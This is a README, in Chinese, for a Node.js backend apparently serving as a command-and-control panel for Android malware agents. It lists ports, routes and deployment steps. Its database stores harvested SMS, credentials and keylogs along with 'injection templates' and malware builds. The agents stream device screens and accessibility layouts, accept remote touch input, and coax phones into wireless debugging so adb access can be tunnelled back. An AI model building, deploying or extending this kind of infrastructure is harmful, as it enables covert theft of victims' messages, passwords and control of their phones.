# 花木工作室 Node 后端

纯 Node.js 实现的花木工作室后端（无任何 Python 依赖）。单进程，监听 4 个端口，SQLite 单文件存储，systemd 常驻。

## 目录结构

```
/root/eagle_node/
├── server.js          主入口：HTTP(39445) + WS 升级分发 + SQLite 建库
├── routes.js          /m/* 管理REST API（登录/设备/数据/AI/构建/系统）
├── zhuque.js          agent WS/HTTP 协议接入（/w 设备WS + /n /p /s 轮询桥）
├── eagle.js           eagle agent 原生 TCP 桥（39444 主控 / 5055 屏幕流 / 5058 布局流）+ adb 直注
├── bridge.js          dxs 无线调试桥（/s/lk WS，15563 adb 隧道）
├── package.json       依赖：better-sqlite3 + ws（npm ci --omit=dev）
├── schema.sql         数据库 Schema 参考文档（实际建库在 server.js 启动时自动执行）
├── tools/             独立调试脚本（不随服务加载，手动 node 运行）
└── node_modules/
```

## 端口总览

| 端口 | 协议 | 用途 | 由谁监听 |
|---|---|---|---|
| 39445 | HTTP/WS（仅 127.0.0.1） | 面板 API /m/*、设备接入 /n /p /s、静态前端、WS 升级 /w /e /s/lk | server.js（nginx 443 反代对外）|
| 39444 | 裸 TCP（0.0.0.0） | eagle agent 主命令通道（行协议 + DEVINFO）| eagle.js |
| 5055 | 裸 TCP（0.0.0.0） | eagle agent 屏幕流（定长 JPEG 帧）| eagle.js |
| 5058 | 裸 TCP（0.0.0.0） | eagle agent 屏幕阅读器布局流（LAYOUT_JSON）| eagle.js |
| 15563 | TCP（仅 127.0.0.1） | adb 直注隧道出口（dxs 桥 ↔ 手机 adbd）| bridge.js |
| 5038 | TCP（仅 127.0.0.1） | 共享 adb server（勿用默认 5037，避免与调试 adb 冲突）| adb5038.service（bb 上为 5037，见 xy-replica 的 Environment）|

## 请求分发（server.js）

```
nginx 443 ──> 127.0.0.1:39445
  ├─ /m/*            → routes.js（JWT 鉴权，登录 POST /m/login）
  ├─ /n* /p/* /s/*   → zhuque.js httpHandler（agent HTTP 接入；/s/lk 的 WS 升级除外）
  ├─ 静态/其余        → /root/xyzcs_front SPA
  └─ WS Upgrade
      ├─ /w    → zhuque.handleDeviceWs（设备实时通道）
      ├─ /e    → 面板浏览器事件通道（订阅设备事件 / vnc_touch 触控下发）
      └─ /s/lk → bridge.handleBridgeWs（dxs 无线调试桥）
```

## 设备接入方式（三选一，自动识别）

| 方式 | 接入路径 | 典型设备 |
|---|---|---|
| eagle 原生 TCP | 39444/5055/5058 直连 | 花木终端 agent（eagle.js，source='eagle'）|
| agent WebSocket | POST /n 注册 + /w 长连 | 朱雀系 agent（zhuque.js）|
| HTTP 轮询 | /p/* /s/* 短轮询 | 无 WS 能力的旧 agent / dxs 桥设备 |

命令下发统一入口：`POST /m/device/:id/command` → `zhuque.commandAny`（eagle 设备转 eagle.js，其余走 dispatch：WS 在线即发、离线入队列等轮询）。

## 数据库

- 路径：`/root/xyzcs_replica.db`（SQLite WAL 模式，better-sqlite3 同步驱动）
- 启动自动建 12 张表（幂等），Schema 详见 `schema.sql`
- 业务大表：devices（设备全量 JSON 快照）、sms / credentials / keylogs（采集数据）、
  generic（泛型 JSON 存储：builds 构建队列、注入模板、自动构建配置）
- 备份：直接拷贝 .db 文件（先 `sqlite3 xxx.db ".backup 目标"` 保证一致）

## 无线调试链路（bridge.js，当前捕获模式）

```
手机 agent ──引导开启无线调试 + TLS 配对（agent 内置）──> 手机 adbd(随机端口)
agent 部署 dxs(tpx, Go) ──> dxs 反连 wss://面板/s/lk?di=<android_id>（30s ping）
面板 adb server(5038) ──> 127.0.0.1:15563 ──> /s/lk 桥 ──> dxs ──> 手机 adbd
```
协议状态：ping/pong 已实证保活；数据帧序列（open/data/close）待实机捕获后实现直通。

## 运维

```bash
systemctl status xy-replica        # 服务状态（active = node server.js）
systemctl restart xy-replica       # 重启（改代码后必须）
tail -f /tmp/xy_bridge.log         # 运行日志（请求/命令/桥接帧全在这里）
tail -f /tmp/xy_replica.log        # systemd 标准输出（崩溃栈在这里）
npm ci --omit=dev                  # 重装依赖（换机/升级后）
```

- 登录账号：`routes.js` 顶部 ADMIN_USER / ADMIN_PASS（admin / <redacted-password>）
- 部署位置：<prod-domain-1>（<prod-ip-1>）与 <prod-domain-2>（<prod-ip-2>）两台同源
- 改动后部署：scp 五个 .js + schema.sql 到 /root/eagle_node/ → systemctl restart xy-replica
